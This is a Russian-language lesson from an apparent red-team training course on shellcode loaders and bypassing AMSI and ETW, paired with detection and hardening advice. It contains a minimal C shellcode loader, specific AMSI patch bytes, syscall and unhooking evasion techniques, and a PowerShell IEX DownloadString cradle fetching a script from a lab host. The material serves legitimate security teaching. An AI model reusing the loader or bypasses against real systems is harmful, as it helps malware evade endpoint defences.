# 12.3 — Лоадеры и обход AMSI/ETW

> **M12 · Этап 2 · 6 ч · 🔴 · артефакт:** `labs/m12-evasion/l03-loaders/`

## Цель

Понять, как лоадер загружает shellcode в память и какие техники обхода AMSI/ETW существуют, их признаки и ограничения.

## Результат

- Свой минимальный лоадер на C.
- Понимание 3 техник обхода и их детекта.
- Честная оценка: что работает на Defender 2026, а что нет.

## Теория

### 1. Анатомия лоадера

1. Получить shellcode (embedded/encrypted/download).
2. Расшифровать.
3. `VirtualAlloc` (RW) → `VirtualProtect` (RX).
4. Скопировать.
5. Передать управление (`CreateThread`, `EnumWindows`, callback).

Каждый шаг — потенциальный хук.

### 2. Обход AMSI

- **Патчинг `AmsiScanBuffer`** — заменить пролог на `mov eax, 0x80070057; ret`. Просто, но сигнатурно.
- **Патчинг `amsiInitFailed`** — заставить AMSI «сломаться». Тоже известно.
- **HW breakpoints** — не менять код, ставить точку останова через debug registers.
- **AMSI providers** — подмена/удаление провайдера (требует прав).
- **Obfuscation** — не обход, а уклонение; работает, пока не обновят правила.

Все публичные техники быстро попадают в сигнатуры. Ценность — в понимании, а не в готовом байт-патче.

### 3. Обход ETW

- Патчинг `EtwEventWrite` в `ntdll` — классика, детектится.
- `NtTraceEvent` / провайдеры — сложнее.
- Отключение конкретного провайдера (например, `.NET`) — заметно.

### 4. Userland hooks и syscalls

EDR хукает `ntdll`. Обходы:

- **Direct syscalls** — свой stub с `syscall` инструкцией. Признак: `syscall` в не-`ntdll` регионе.
- **Indirect syscalls** — переход в `ntdll` по адресу, минуя хук.
- **Unhooking** — восстановить оригинальные байты `ntdll` из `KnownDlls`/файла.
- **HW breakpoints** — обход хуков без изменения кода.

### 5. Реальность

Современный EDR смотрит не только на хуки, но и на:

- call stack (откуда пришёл syscall);
- память (RX-регион без файла);
- поведение (инжект, сеть, credential access);
- корреляцию.

Один трюк не даёт «невидимости». Инженерный подход: минимизировать поведение, использовать легитимные механизмы, тестировать и измерять.

## Лаборатория

> `WIN01` + Defender. Все артефакты — в `C:\lab`, снимок обязателен.

### 1. Минимальный лоадер

```c
#include <windows.h>
#include <stdio.h>

int main(void) {
    unsigned char sc[] = { 0x90, 0x90, 0xc3 }; // замените на свой shellcode
    LPVOID p = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!p) return 1;
    memcpy(p, sc, sizeof(sc));
    DWORD old;
    VirtualProtect(p, sizeof(sc), PAGE_EXECUTE_READ, &old);
    ((void(*)())p)();
    return 0;
}
```

Соберите:

```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe
```

Ожидаемо: запуск без сети (shellcode `ret`). Если Defender ругается — запишите имя детекта.

### 2. Проверка AMSI

```powershell
# в PowerShell
$s = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.50/x.ps1")'
# Defender/AMSI должен отреагировать на подозрительную строку при выполнении
```

Ожидаемо: блокировка/предупреждение. Не пытайтесь «обойти» в этой лабе — цель понять реакцию.

### 3. Наблюдение за памятью

```powershell
# Process Hacker / Process Explorer: смотрим регион loader.exe
# Ищем PAGE_EXECUTE_READ без mapped file
```

Ожидаемо: приватный RX-регион. Это типовой признак для EDR.

### 4. ETW

```powershell
logman query providers | findstr /i "DotNET Threat-Intelligence PowerShell"
```

Ожидаемо: список провайдеров. Включите PowerShell-провайдер и посмотрите события при выполнении скрипта.

### 5. Сравнение техник

Заполните таблицу:

| Техника | Что обходит | Признак | Работает на Defender? |
|---|---|---|---|

## Атака и защита

- **Атака:** уменьшать шум, а не «патчить всё».
- **Детект:** call stack, RX-память без файла, ETW, AMSI-события, поведение.
- **Фикс:** Defender + ASR + WDAC + EDR-корреляция, регулярные purple-тесты.

## Самопроверка

- [ ] Почему патчинг AMSI — плохая стратегия?
- [ ] Чем direct syscall отличается от indirect?
- [ ] Что видит EDR в call stack?
- [ ] Почему RX-память без файла подозрительна?
- [ ] Что такое unhooking?

## Дальше

[12.4 — LOLBins и AppLocker](l04-lolbins-applocker.md)
